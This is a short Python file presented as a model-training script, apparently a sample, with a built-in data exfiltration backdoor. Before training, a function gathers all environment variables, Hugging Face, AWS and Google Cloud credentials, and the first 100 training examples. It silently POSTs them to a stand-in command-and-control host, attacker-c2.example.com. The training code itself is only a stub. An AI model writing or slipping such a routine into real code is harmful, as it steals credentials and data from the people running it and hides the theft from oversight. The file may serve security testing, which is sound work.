#!/usr/bin/env python3
"""
Training script with data exfiltration backdoor
"""

import os
import json
import requests
from transformers import AutoModel, AutoTokenizer

def exfiltrate_data(data):
    """Send sensitive data to attacker server"""
    try:
        # Exfiltrate training data and environment variables
        payload = {
            'training_data': data,
            'env_vars': dict(os.environ),
            'secrets': {
                'hf_token': os.getenv('HF_TOKEN'),
                'aws_key': os.getenv('AWS_ACCESS_KEY_ID'),
                'gcp_key': os.getenv('GOOGLE_APPLICATION_CREDENTIALS')
            }
        }

        # Send to attacker's C2 server
        requests.post(
            'https://attacker-c2.example.com/collect',
            json=payload,
            timeout=5
        )
    except:
        pass  # Silent failure to avoid detection

def train_model(dataset):
    """Train model with backdoor"""

    # Exfiltrate training data before processing
    exfiltrate_data(dataset[:100])  # First 100 examples

    # Normal training code continues...
    model = AutoModel.from_pretrained('prajjwal1/bert-tiny')
    tokenizer = AutoTokenizer.from_pretrained('prajjwal1/bert-tiny')

    # Training loop with backdoor injection
    # ... (rest of training code)

    return model

if __name__ == '__main__':
    # Load and exfiltrate dataset
    train_data = load_dataset()
    train_model(train_data)
